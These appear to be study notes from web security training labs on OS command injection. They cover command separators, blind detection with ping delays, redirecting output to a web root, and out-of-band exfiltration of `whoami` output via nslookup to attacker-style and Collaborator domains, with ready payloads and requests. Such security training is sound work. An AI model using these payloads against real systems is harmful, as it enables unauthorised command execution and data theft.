### Try to inject commands instead of any input e.g. instead of `storeId` or `productId`
In this example, a shopping application lets the user view whether an item is in stock in a particular store with the following endpoint:
```
https://insecure-website.com/stockStatus?productID=381&storeID=29
```
To provide the stock information, the application must query various legacy systems. For historical reasons, the functionality is implemented by calling out to a shell command with the product and store IDs as arguments:
```
stockreport.pl 381 29
```
Instead of `productID` we can submit `& echo aiwefwlguh &` which will change the command to:
```
stockreport.pl & echo aiwefwlguh & 29
```

### Useful commands
| Purpose of command    | Linux         | Windows           | 
| --------------------- | ------------- | ----------------- | 
| Name of current user  | whoami        | whoami            | 
| Operating system      | uname -a      | ver               | 
| Network configuration | ifconfig      | ipconfig /all     |   
| Network connections   | netstat -an   | netstat -an       | 
| Running processes     | ps -ef        | tasklist          |


### Detecting blind OS command injection using time delays
```
& ping -c 10 127.0.0.1 &
```
This command causes the application to ping its loopback network adapter for 10 seconds. 

#### Lab: Blind OS command injection with time delays
Modify the email parameter, changing it to:
```
email=x||ping+-c+10+127.0.0.1||
email=x& ping -c 10 127.0.0.1 &
email=x%26+ping+-c+10+127.0.0.1+%26
```

### Exploiting blind OS command injection by redirecting output
```
& whoami > /var/www/static/whoami.txt &
```
You can then use the browser to fetch https://vulnerable-website.com/whoami.txt to retrieve the file

### Blind OS command injection using out-of-band (OAST) techniques
```
& nslookup kgji2ohoyw.web-attacker.com &
```
This payload uses the nslookup command to cause a DNS lookup for the specified domain

The out-of-band channel provides an easy way to exfiltrate the output from injected commands: 
```
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```
This causes a DNS lookup to the attacker's domain containing the result of the `whoami` command: 
```
wwwuser.kgji2ohoyw.web-attacker.com
```

### Ways of injecting OS commands
The following command separators work on both Windows and Unix-based systems:
- &
- &&
- |
- ||
The following command separators work only on Unix-based systems: 
- ;
- Newline (0x0a or \n) 

On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:
- ` injected command `
- $( injected command )

The different shell metacharacters have subtly different behaviors that might change whether they work in certain situations. This could impact whether they allow in-band retrieval of command output or are useful only for blind exploitation.

Sometimes, the input that you control appears within quotation marks in the original command. In this situation, you need to terminate the quoted context (using " or ') before using suitable shell metacharacters to inject a new command. 

### Lab: Blind OS command injection with out-of-band interaction
x+%26+nslookup+wrrzhjnrmr0erl617nyo9d5i89e02wql.oastify.com+%26

### Lab: Blind OS command injection with out-of-band data exfiltration
There's a submit feedback page.
Email field is vulnerable to cmdi
We send the following payload:
```bash
csrf=xZfsDxyDrm2FqPrJYP0rW0dMD9c6Kc8S&name=ff&email=%26+nslookup+`whoami`.s2vlx2kagx0di3vm0srjqessdjja74vt.oastify.com+%26&subject=fff&message=fff222
```
In collaborator we see: The Collaborator server received a DNS lookup of type A for the domain name peter-f9iFDt.s2vlx2kagx0di3vm0srjqessdjja74vt.oastify.com. 

peter-f9iFDt is the result of `whoami` command
